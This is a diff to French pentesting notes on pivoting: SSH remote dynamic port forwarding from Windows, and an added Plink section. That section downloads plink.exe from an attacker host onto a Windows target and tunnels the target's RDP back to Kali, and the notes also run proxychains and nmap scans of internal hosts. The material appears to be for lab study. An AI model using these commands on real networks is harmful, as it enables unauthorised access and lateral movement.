@@ -11,7 +11,7 @@ ssh -V   # doit être >= 7.6 pour le remote dynamic port forwarding
 
 La syntaxe est identique au client Linux — on peut donc créer les mêmes tunnels (remote, remote dynamic, local…).
 
-### Remote Dynamic Port Forwarding depuis Windows
+**Remote Dynamic Port Forwarding depuis Windows**
 
 ```cmd
 ssh -N -R 9998 kali@<IP_KALI>
@@ -26,4 +26,44 @@ socks5 127.0.0.1 9998
 # Utilisation depuis Kali
 proxychains psql -h <IP_INTERNE> -U postgres
 proxychains nmap -sT -n -Pn --top-ports=20 <IP_CIBLE>
+```
+
+## Plink
+
+Alternative à OpenSSH quand celui-ci n'est pas disponible. Binaire autonome, aucune installation requise, discret (outil d'admin courant).
+
+**Limitations :** pas de remote dynamic port forwarding. Le mot de passe passé en clair sur la ligne de commande peut être loggué.
+
+### Déposer Plink sur la cible
+
+```bash
+cp /usr/share/windows-resources/binaries/plink.exe .
+python3 -m http.server 80
+```
+
+Depuis la cible Windows
+```cmd
+powershell wget -Uri http://<IP_KALI>/plink.exe -OutFile C:\Windows\Temp\plink.exe
+```
+
+### Remote Port Forwarding
+
+```cmd
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:<PORT_KALI>:127.0.0.1:<PORT_CIBLE> <IP_KALI>
+```
+
+```cmd
+:: Exemple : ramener le port RDP (3389) sur le port 9833 de Kali
+C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <IP_KALI>
+```
+
+> Si le shell ne permet pas de répondre à la confirmation de clé SSH, piper `y` directement :
+> ```cmd
+> cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 <IP_KALI>
+> ```
+
+### Utiliser le tunnel depuis Kali
+
+```bash
+xfreerdp /u:<user> /p:<password> /v:127.0.0.1:9833
 ```
